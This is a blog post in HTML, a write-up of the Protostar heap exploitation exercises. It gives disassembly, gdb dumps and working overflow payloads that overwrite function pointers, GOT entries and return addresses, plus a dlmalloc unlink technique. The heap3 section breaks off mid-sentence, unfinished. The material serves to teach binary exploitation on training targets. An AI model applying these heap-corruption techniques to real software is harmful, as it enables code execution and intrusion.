<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Heap levels">
  <title>Exploit Exercises - Protostar - Heap levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the heap level exploitation.">

  
  <meta itemprop="keywords" content="exploit exercises, protostar, challenge" />
  
    <meta itemprop="wordCount" content="2967">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Heap levels" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Heap-levels/" />
  

  
  <meta property="og:updated_time" content="2014-11-01 11:52:17 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Heap levels"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  

  
  
  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.37.1" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://camelinc.info/</h2>
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Heap levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-11-01</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="heap-0">Heap 0</h1>

<p>For this scenario we need to run the winner() function.
To get a better idea about the binary a look at the assembly helps.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08048492 &lt;main+6&gt;:    sub    $0x20,%esp
0x08048495 &lt;main+9&gt;:    movl   $0x40,(%esp)
0x0804849c &lt;main+16&gt;:   call   0x8048388 &lt;malloc@plt&gt;  ; malloc(64)
0x080484a1 &lt;main+21&gt;:   mov    %eax,0x18(%esp)         ; store address
0x080484a5 &lt;main+25&gt;:   movl   $0x4,(%esp)
0x080484ac &lt;main+32&gt;:   call   0x8048388 &lt;malloc@plt&gt;  ; malloc(4)
0x080484b1 &lt;main+37&gt;:   mov    %eax,0x1c(%esp)         ; store address
0x080484b5 &lt;main+41&gt;:   mov    $0x8048478,%edx         ; nowinner()
0x080484ba &lt;main+46&gt;:   mov    0x1c(%esp),%eax
0x080484be &lt;main+50&gt;:   mov    %edx,(%eax)
0x080484c0 &lt;main+52&gt;:   mov    $0x80485f7,%eax         ; &#34;data is at %p, fp is at %p\n&#34;
0x080484dd &lt;main+81&gt;:   mov    0xc(%ebp),%eax
...
0x080484e0 &lt;main+84&gt;:   add    $0x4,%eax
0x080484e3 &lt;main+87&gt;:   mov    (%eax),%eax
0x080484e5 &lt;main+89&gt;:   mov    %eax,%edx
0x080484e7 &lt;main+91&gt;:   mov    0x18(%esp),%eax
0x080484eb &lt;main+95&gt;:   mov    %edx,0x4(%esp)
0x080484ef &lt;main+99&gt;:   mov    %eax,(%esp)
0x080484f2 &lt;main+102&gt;:  call   0x8048368 &lt;strcpy@plt&gt;  ; vulnerable function
0x080484f7 &lt;main+107&gt;:  mov    0x1c(%esp),%eax         ; load pointer
0x080484fb &lt;main+111&gt;:  mov    (%eax),%eax             ; follow pointer
0x080484fd &lt;main+113&gt;:  call   %eax                    ; execute function pointer</code></pre></div>

<p>So, the binary allocates 64+4 bytes on the heap.
Afterwards, the argument is copied into the first allocated memory part.
As strcpy does not limit the length, we can write into the second variable.
That variable contains a function pointer that is executed afterwards.</p>

<p>So in order to overwrite the function pointer we have to write</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ /opt/protostar/bin/heap0 $(perl -e &#39;print &#34;A&#34;x72 . &#34;\x64\x84\x04\x08&#34;;&#39;)
data is at 0x804a008, fp is at 0x804a050
level passed</code></pre></div>

<h1 id="heap-1">Heap 1</h1>

<p>Again, we need to run the winner() function.
Let&rsquo;s see what&rsquo;s going on.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x080484c2 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x8       ; pass 8
0x080484c9 &lt;main+16&gt;:   call   0x80483bc &lt;malloc@plt&gt;    ; allocate
0x080484ce &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax  ; store PTR
0x080484d2 &lt;main+25&gt;:   mov    eax,DWORD PTR [esp+0x14]
0x080484d6 &lt;main+29&gt;:   mov    DWORD PTR [eax],0x1       ; store 1
;
0x080484dc &lt;main+35&gt;:   mov    DWORD PTR [esp],0x8       ; pass 8
0x080484e3 &lt;main+42&gt;:   call   0x80483bc &lt;malloc@plt&gt;    ; allocate
0x080484e8 &lt;main+47&gt;:   mov    edx,eax
0x080484ea &lt;main+49&gt;:   mov    eax,DWORD PTR [esp+0x14]
0x080484ee &lt;main+53&gt;:   mov    DWORD PTR [eax+0x4],edx   ; store pointer
;
0x080484f1 &lt;main+56&gt;:   mov    DWORD PTR [esp],0x8       ; pass 8
0x080484f8 &lt;main+63&gt;:   call   0x80483bc &lt;malloc@plt&gt;    ; allocate
0x080484fd &lt;main+68&gt;:   mov    DWORD PTR [esp+0x18],eax  ; store PTR
0x08048501 &lt;main+72&gt;:   mov    eax,DWORD PTR [esp+0x18]
0x08048505 &lt;main+76&gt;:   mov    DWORD PTR [eax],0x2       ; store 2
;
0x0804850b &lt;main+82&gt;:   mov    DWORD PTR [esp],0x8       ; pass 8
0x08048512 &lt;main+89&gt;:   call   0x80483bc &lt;malloc@plt&gt;    ; allocate
0x08048517 &lt;main+94&gt;:   mov    edx,eax
0x08048519 &lt;main+96&gt;:   mov    eax,DWORD PTR [esp+0x18]
0x0804851d &lt;main+100&gt;:  mov    DWORD PTR [eax+0x4],edx   ; store pointer
...</code></pre></div>

<p>So this time we have four mallocs with 8 bytes each.
Also, some kind of counter.
The data structure includes an integer as well as a char array.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x08048520 &lt;main+103&gt;:  mov    eax,DWORD PTR [ebp+0xc]    ; ARG
0x08048523 &lt;main+106&gt;:  add    eax,0x4                    ; ARGV2
0x08048526 &lt;main+109&gt;:  mov    eax,DWORD PTR [eax]        ; resolve pointer
0x08048528 &lt;main+111&gt;:  mov    edx,eax
0x0804852a &lt;main+113&gt;:  mov    eax,DWORD PTR [esp+0x14]   ; load struct1 PTR
0x0804852e &lt;main+117&gt;:  mov    eax,DWORD PTR [eax+0x4]    ; PTR+4
0x08048531 &lt;main+120&gt;:  mov    DWORD PTR [esp+0x4],edx    ; pass ARGV1
0x08048535 &lt;main+124&gt;:  mov    DWORD PTR [esp],eax        ; pass struct1[1]
0x08048538 &lt;main+127&gt;:  call   0x804838c &lt;strcpy@plt&gt;
;
0x0804853d &lt;main+132&gt;:  mov    eax,DWORD PTR [ebp+0xc]    ; ARG
0x08048540 &lt;main+135&gt;:  add    eax,0x8                    ; ARGV2
0x08048543 &lt;main+138&gt;:  mov    eax,DWORD PTR [eax]        ; resolve pointer
0x08048545 &lt;main+140&gt;:  mov    edx,eax
0x08048547 &lt;main+142&gt;:  mov    eax,DWORD PTR [esp+0x18]   ; load struct2 PTR
0x0804854b &lt;main+146&gt;:  mov    eax,DWORD PTR [eax+0x4]    ; PTR+4
0x0804854e &lt;main+149&gt;:  mov    DWORD PTR [esp+0x4],edx    ; pass ARGV2
0x08048552 &lt;main+153&gt;:  mov    DWORD PTR [esp],eax        ; pass struct2[1]
0x08048555 &lt;main+156&gt;:  call   0x804838c &lt;strcpy@plt&gt;
0x0804855a &lt;main+161&gt;:  mov    DWORD PTR [esp],0x804864b
0x08048561 &lt;main+168&gt;:  call   0x80483cc &lt;puts@plt&gt;
...</code></pre></div>

<p>And lets take a short look at the heap layout just before the executable terminates.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">gdb$ run AAAAAx/20x 0x0804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x41414141      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x42424242      0x42424242      0x00000000      0x00020fc1</code></pre></div>

<p>In order to exploit the code we have to manipulate the destination address of 2nd strcpy.
To do this, we will write 20 bytes with the first argument.
By doing this, we can overwrite the pointer in struct2.
Next, we need to find a suitable location so we can run winner().</p>

<h2 id="method-1-got">Method 1 - GOT</h2>

<p>We can overwrite the global address table information of puts.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">gdb$ x/i 0x80483cc
0x80483cc &lt;puts@plt&gt;:   jmp    DWORD PTR ds:0x8049774
gdb$ x/x 0x8049774
0x8049774 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;:   0x080483d2
gdb$ print winner
$1 = {void (void)} 0x8048494 &lt;winner&gt;</code></pre></div>

<p>With the relevant addresses, we put our exploit to a trial.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ /opt/protostar/bin/heap1 $(perl -e &#39;print &#34;A&#34;x20 .&#34;\x74\x97\x04\x08&#34; .&#34; \x94\x84\x04\x08&#34;;&#39;)
and we have a winner @ 1409411437</code></pre></div>

<h2 id="method-2-return-address">Method 2 - Return-Address</h2>

<p>Another option is to overwrite the return address of the stack frame.
To do this, we have to overwrite EBP+4 with our target destination.
In our case that would be 0xbffff61c.</p>

<p>But with gdb the addresses are slightly off.
So with a little trial and error, we get the correct offset 0xbffff62c.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ /opt/protostar/bin/heap1 $(perl -e &#39;print &#34;A&#34;x20 .&#34;\x2c\xf6\xff\xbf&#34; .&#34; \x94\x84\x04\x08&#34;;&#39;)
and that&#39;s a wrap folks!
and we have a winner @ 1409414149
Segmentation fault (core dumped)</code></pre></div>

<h1 id="heap-2">Heap 2</h1>

<p>This time we have something like a login service.
Lets see what the assembly tells about the binary.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x08048940 &lt;main+12&gt;:   jmp    0x8048943 &lt;main+15&gt;
0x08048942 &lt;main+14&gt;:   nop
0x08048943 &lt;main+15&gt;:   mov    0x804b5f8,%ecx      ; service
0x08048949 &lt;main+21&gt;:   mov    0x804b5f4,%edx      ; auth
0x0804894f &lt;main+27&gt;:   mov    $0x804ad70,%eax     ; &#34;[ auth = %p, service = %p ]\n&#34;
0x08048954 &lt;main+32&gt;:   mov    %ecx,0x8(%esp)      ; pass service
0x08048958 &lt;main+36&gt;:   mov    %edx,0x4(%esp)      ; pass auth
0x0804895c &lt;main+40&gt;:   mov    %eax,(%esp)         ; pass format string
0x0804895f &lt;main+43&gt;:   call   0x804881c &lt;printf@plt&gt;
...</code></pre></div>

<p>This is simply the additional information, that should help beginners like us.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x08048964 &lt;main+48&gt;:   mov    0x804b164,%eax     ; stdin()
0x08048969 &lt;main+53&gt;:   mov    %eax,0x8(%esp)     ; pass stdin
0x0804896d &lt;main+57&gt;:   movl   $0x80,0x4(%esp)    ; pass 120
0x08048975 &lt;main+65&gt;:   lea    0x10(%esp),%eax
0x08048979 &lt;main+69&gt;:   mov    %eax,(%esp)        ; pass line
0x0804897c &lt;main+72&gt;:   call   0x80487ac &lt;fgets@plt&gt;
;...</code></pre></div>

<p>So the binary reads up to 120 bytes into a local variable.
This is then compared against four keywords: auth, service, reset, login.
We will examine the respective parts separately.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080489a7 &lt;main+115&gt;:  movl   $0x4,(%esp)
0x080489ae &lt;main+122&gt;:  call   0x804916a &lt;malloc&gt;
0x080489b3 &lt;main+127&gt;:  mov    %eax,0x804b5f4        ; auth
0x080489b8 &lt;main+132&gt;:  mov    0x804b5f4,%eax
0x080489bd &lt;main+137&gt;:  movl   $0x4,0x8(%esp)
0x080489c5 &lt;main+145&gt;:  movl   $0x0,0x4(%esp)        ; pass 0 - zero out allocated heap
0x080489cd &lt;main+153&gt;:  mov    %eax,(%esp)
0x080489d0 &lt;main+156&gt;:  call   0x80487bc &lt;memset@plt&gt;
0x080489d5 &lt;main+161&gt;:  lea    0x10(%esp),%eax       ; line
0x080489d9 &lt;main+165&gt;:  add    $0x5,%eax             ; skip &#34;auth &#34;
0x080489dc &lt;main+168&gt;:  mov    %eax,(%esp)
0x080489df &lt;main+171&gt;:  call   0x80487fc &lt;strlen@plt&gt;
0x080489e4 &lt;main+176&gt;:  cmp    $0x1e,%eax            ; less or equal 31 bytes
0x080489e7 &lt;main+179&gt;:  ja     0x8048a01 &lt;main+205&gt;
0x080489e9 &lt;main+181&gt;:  lea    0x10(%esp),%eax       ; line
0x080489ed &lt;main+185&gt;:  lea    0x5(%eax),%edx        ; skip &#34;auth &#34;
0x080489f0 &lt;main+188&gt;:  mov    0x804b5f4,%eax        ; auth
0x080489f5 &lt;main+193&gt;:  mov    %edx,0x4(%esp)
0x080489f9 &lt;main+197&gt;:  mov    %eax,(%esp)
0x080489fc &lt;main+200&gt;:  call   0x804880c &lt;strcpy@plt&gt;^</code></pre></div>

<p>Auth will allocate 4 bytes on the heap.
That memory space will be zeroed out.
Afterwards, the string length is checked, excluding the keyword.
This is probably done, due to some size restrictions of the destination variable.
Then, the user input is copied to the allocated memory.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08048a21 &lt;main+237&gt;:  mov    0x804b5f4,%eax         ; auth
0x08048a26 &lt;main+242&gt;:  mov    %eax,(%esp)
0x08048a29 &lt;main+245&gt;:  call   0x804999c &lt;free&gt;</code></pre></div>

<p>Reset will free the allocated memory for auth.
No security checks are present.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08048a4e &lt;main+282&gt;:  lea    0x10(%esp),%eax        ; line
0x08048a52 &lt;main+286&gt;:  add    $0x7,%eax              ; skip &#34;service&#34;
0x08048a55 &lt;main+289&gt;:  mov    %eax,(%esp)
0x08048a58 &lt;main+292&gt;:  call   0x804886c &lt;strdup@plt&gt;
0x08048a5d &lt;main+297&gt;:  mov    %eax,0x804b5f8         ; service</code></pre></div>

<p>Service will simply copy the input string to service.
No security checks are present.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08048a86 &lt;main+338&gt;:  mov    0x804b5f4,%eax         ; auth
0x08048a8b &lt;main+343&gt;:  mov    0x20(%eax),%eax        ; auth+32
0x08048a8e &lt;main+346&gt;:  test   %eax,%eax
0x08048a90 &lt;main+348&gt;:  je     0x8048aa3 &lt;main+367&gt;
0x08048a92 &lt;main+350&gt;:  movl   $0x804ada7,(%esp)      ; pass &#34;you have logged in already!&#34;
0x08048a99 &lt;main+357&gt;:  call   0x804883c &lt;puts@plt&gt;
0x08048a9e &lt;main+362&gt;:  jmp    0x8048943 &lt;main+15&gt;    ; loop
0x08048aa3 &lt;main+367&gt;:  movl   $0x804adc3,(%esp)      ; pass &#34;please enter your password&#34;
0x08048aaa &lt;main+374&gt;:  call   0x804883c &lt;puts@plt&gt;
0x08048aaf &lt;main+379&gt;:  jmp    0x8048943 &lt;main+15&gt;    ; loop</code></pre></div>

<p>Login will load the auth struct pointer.
Then, it adjusts the pointer by 32 bytes.
This corresponds to the length check for &ldquo;auth&rdquo;.
The problem is, that only four bytes are mallocated.
This also gives an idea about the most simple solution to solve this level.</p>

<h2 id="malloc">malloc</h2>

<p>A char array for malloc only represents a single pointer.
The struct also contains an integer for authentication.
Thus malloc allocates eight bytes for the struct.
At the same time the char array has a size of 32 bytes.
This means, that the integer is located at struct+32.
Let&rsquo;s take a look at the memory layout.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/10x 0x804c008
0x804c008:      0x61616161      0x0000000a      0x00000000      0x00000019
0x804c018:      0x62626220      0x62626262      0x62626262      0x62626262
0x804c028:      0x00000a62      0x00000fd9</code></pre></div>

<p>The auth struct is stored at 0x804c008.
The service variable is stored right after that.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ python -c &#39;print &#34;auth AAAA\n&#34; + &#34;service&#34; + &#34;B&#34; * 16 + &#34;\n&#34; + &#34;login\n&#34;&#39; | /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
[ auth = 0x804c008, service = 0x804c018 ]</code></pre></div>

<p>This is how we can get a nonzero value at the relevant memory position.
Probably the most simple solution to this task.</p>

<h1 id="heap-3">Heap 3</h1>

<p>Let&rsquo;s examine the assembly of this level right away.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08048892 &lt;main+9&gt;:    movl   $0x20,(%esp)        ; pass 32
0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x0804889e &lt;main+21&gt;:   mov    %eax,0x14(%esp)     ; A
0x080488a2 &lt;main+25&gt;:   movl   $0x20,(%esp)        ; pass 32
0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488ae &lt;main+37&gt;:   mov    %eax,0x18(%esp)     ; B
0x080488b2 &lt;main+41&gt;:   movl   $0x20,(%esp)        ; pass 32
0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488be &lt;main+53&gt;:   mov    %eax,0x1c(%esp)     ; C</code></pre></div>

<p>So the binary allocates three heap variables with 32 byte.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080488c2 &lt;main+57&gt;:   mov    0xc(%ebp),%eax      ; ARGV
0x080488c5 &lt;main+60&gt;:   add    $0x4,%eax           ; ARG1
0x080488c8 &lt;main+63&gt;:   mov    (%eax),%eax
0x080488ca &lt;main+65&gt;:   mov    %eax,0x4(%esp)
0x080488ce &lt;main+69&gt;:   mov    0x14(%esp),%eax     ; A
0x080488d2 &lt;main+73&gt;:   mov    %eax,(%esp)
0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
0x080488da &lt;main+81&gt;:   mov    0xc(%ebp),%eax      ; ARGV
0x080488dd &lt;main+84&gt;:   add    $0x8,%eax           ; ARG2
0x080488e0 &lt;main+87&gt;:   mov    (%eax),%eax
0x080488e2 &lt;main+89&gt;:   mov    %eax,0x4(%esp)
0x080488e6 &lt;main+93&gt;:   mov    0x18(%esp),%eax     ; B
0x080488ea &lt;main+97&gt;:   mov    %eax,(%esp)
0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x080488f2 &lt;main+105&gt;:  mov    0xc(%ebp),%eax      ; ARGV
0x080488f5 &lt;main+108&gt;:  add    $0xc,%eax           ; ARG3
0x080488f8 &lt;main+111&gt;:  mov    (%eax),%eax
0x080488fa &lt;main+113&gt;:  mov    %eax,0x4(%esp)
0x080488fe &lt;main+117&gt;:  mov    0x1c(%esp),%eax     ; C
0x08048902 &lt;main+121&gt;:  mov    %eax,(%esp)
0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x0804890a &lt;main+129&gt;:  mov    0x1c(%esp),%eax</code></pre></div>

<p>Then the arguments are copied to the allocated memory locations.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804890a &lt;main+129&gt;:  mov    0x1c(%esp),%eax     ; C
0x0804890e &lt;main+133&gt;:  mov    %eax,(%esp)
0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
0x08048916 &lt;main+141&gt;:  mov    0x18(%esp),%eax     ; B
0x0804891a &lt;main+145&gt;:  mov    %eax,(%esp)
0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
0x08048922 &lt;main+153&gt;:  mov    0x14(%esp),%eax     ; A
0x08048926 &lt;main+157&gt;:  mov    %eax,(%esp)
0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
0x0804892e &lt;main+165&gt;:  movl   $0x804ac27,(%esp)
0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;</code></pre></div>

<p>Then, the three variables are free()d.
And let&rsquo;s take a look at the heap right after the mallocs.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/8x $esp+0x14
0xbffff654:     0x0804c008      0x0804c030      0x0804c058      0x0804ab50
0xbffff664:     0x00000000      0xbffff6e8      0xb7eadc76      0x00000004
(gdb) x/12x 0x0804c008-8
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
(gdb) x/12x 0x0804c030-8
0x804c028:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c048:      0x00000000      0x00000000      0x00000000      0x00000029
(gdb) x/12x 0x0804c058-8
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89</code></pre></div>

<h2 id="malloc-free">Malloc &amp; free</h2>

<p>A good explanation of heap memory management is available in phrack 57 - Once upon a free().
Let&rsquo;s just sum up the essential parts.</p>

<p>Malloc allocates the number of requested bytes + 8.
The layout on the heap of a single chunk looks as follows:</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">;            +----------------------------------+
    chunk -&gt; | prev_size                        |
             +----------------------------------+
             | size                         |M|P|
             +----------------------------------+
      mem -&gt; | data                             |
             : ...                              :
             +----------------------------------+
nextchunk -&gt; | prev_size ...                    |
             :                                  :</code></pre></div>

<p>In the above listing M corresponds to the IS_MMAPPED flag.
P on the other hand, corresponds to the PREV_INUSE flag.</p>

<p>After free()ing the memory, the unallocated chunks are kept in an double-linked list.
The chunk usually includes size and prev_size as well as a pointer forward and backwards.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">;            +----------------------------------+
    chunk -&gt; | prev_size                        |
             +----------------------------------+
             | size                             |
             +----------------------------------+
      mem -&gt; | fd                               |
             +----------------------------------+
             | bk                               |
             +----------------------------------+
             | (old memory, can be zero bytes)  |
             :                                  :
nextchunk -&gt; | prev_size ...                    |
             :                                  :</code></pre></div>

<p>With malloc based buffer overflow we can manipulate the heap structure.
Subsequently, free()ing utilizes <em>fd</em> an <em>bk</em> pointers to adjust the list.
This write allows use to e.g. manipulate the Global Offset Table.</p>

<p>A few aspects have to be taken into consideration:</p>

<ul>
<li>the least significant bit of &lsquo;size&rsquo; has to be zero (PREV_INUSE).</li>
<li>&lsquo;prev_size&rsquo; and &lsquo;size&rsquo; should be add-safe to a pointer that is read from. So either use very small values up to a few thousand, or use big values such as 0xfffffffc.</li>
<li>(chunk_boundary + size + 4) the lowest bit is zeroed out (0xfffffffc will work just fine)</li>
<li>(bk + 8) will be overwritten. A short jump can help thwart that problem.</li>
</ul>

<p>An generic way to exploit this vulnerability looks as follows:</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">;            +----------------------------------+
   retloc -&gt; | \xeb\x0c \x90\x90                |
             +----------------------------------+
             | \x90\x90\x90\x90                 |
             :  shellcode                       :
             +----------------------------------+
    chunk -&gt; | \xff\xff\xff\xfc                 |
             +----------------------------------+
             | \xf0                             |
             +----------------------------------+
      mem -&gt; | retloc - 0xc                     |
             +----------------------------------+
             | retaddr                          |
             +----------------------------------+
             :                                  :</code></pre></div>

<p>Let&rsquo;s try this approach.</p>

<h2 id="bending-the-heap">Bending the Heap</h2>

<p>The trick here is to use a negative value for the previous chunk size.
This forces the previous chunk to be calculated after the current chunk while avoiding null bytes.
Doing this, basically allows us to introduce a virtual chunk.</p>

<p>To be more precise, we can write 32 bytes to fill up one chunk.
Then, we need to append size of previous chunk: <em>0xfffffffc</em> = <em>-4</em>.
Next comes the size of our virtual chunk: <em>0xf0</em> = <em>240</em>.
Any size above 64 bytes with the two LSB set to 8 does the trick.</p>

<!-- TODO: Nice graph //-->

<!-- TODO: with new gdbinit //-->

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Starting program: /opt/protostar/bin/heap3 AAAA $(perl -e &#39;print &#34;B&#34;x32 .&#34;\xfc\xff\xff\xff&#34; .&#34;\xf0&#34;&#39;) CCCCDDDDEEEE

Program received signal SIGSEGV, Segmentation fault.
0x080498fd in free (mem=0x804c058) at common/malloc.c:3638
(gdb) x/12x 0x0804c008-8
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
(gdb) x/12x 0x0804c030-8
0x804c028:      0x00000000      0x00000029      0x42424242      0x42424242
0x804c038:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c048:      0x42424242      0x42424242      0xfffffffc      0x000000f0
(gdb) x/12x 0x0804c058-8
0x804c050:      0xfffffffc      0x000000f0      0x43434343      0x44444444
0x804c060:      0x45454545      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
(gdb) x/i $eip
0x80498fd &lt;free+217&gt;:   mov    %edx,0xc(%eax)
(gdb) i r $eax $edx
eax            0x44444444       1145324612
edx            0x45454545       1162167621</code></pre></div>

<p>Once the free() gets executed it segfaults trying to write to 0x44444444 + 0xc with the value 0x45454545.
This was an expected behavior when trying to unlink the third chunk.</p>

<p>The next step is to set the FD and BK pointers correctly.
For this exercise, we have to execute the winner() function.
To achieve our goal, we can patch the GOT for the puts() call.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ objdump -R /opt/protostar/binheap3 | grep puts
0804b128 R_386_JUMP_SLOT   puts
user@protostar:/$ objdump -R /opt/protostar/binheap3 | grep -i winner
08048864 g     F .text  00000025              winner</code></pre></div>

<p>So we need to overwrite 0x0804b128 with 0x08048864.
The destination address should be adjusted by - 0xc = 0x0804b11c.
Let&rsquo;s see how this works.</p>

<!-- FIXME: Verify the command, seems odd //-->

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Starting program: /opt/protostar/bin/heap3 AAAA $(perl -e &#39;print &#34;B&#34;x32 .&#34;\xfc\xff\xff\xff&#34; .&#34;\xf0&#34;&#39;) $(perl -e &#39;print &#34;CCCC&#34; .&#34;\x1c\xb1\x04\x08&#34; .&#34;\x64\x88\x04\x08&#34;&#39;)

Program received signal SIGSEGV, Segmentation fault.
0x08049906 in free (mem=0x804c058) at common/malloc.c:3638
(gdb) x/x 0x0804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048864
(gdb) x/i $eip
0x8049906 &lt;free+226&gt;:   mov    %edx,0x8(%eax)
(gdb) i r $eax $edx
eax            0x8048864        134514788
edx            0x804b11c        134525212</code></pre></div>

<p>So there&rsquo;s still a problem.
During unlinking, also the location of bk+8 is written.
This winner function is located in the .text section of the binary and is not writeable.
We can try to jump into the first heap chunk and
Let&rsquo;s take a look.</p>

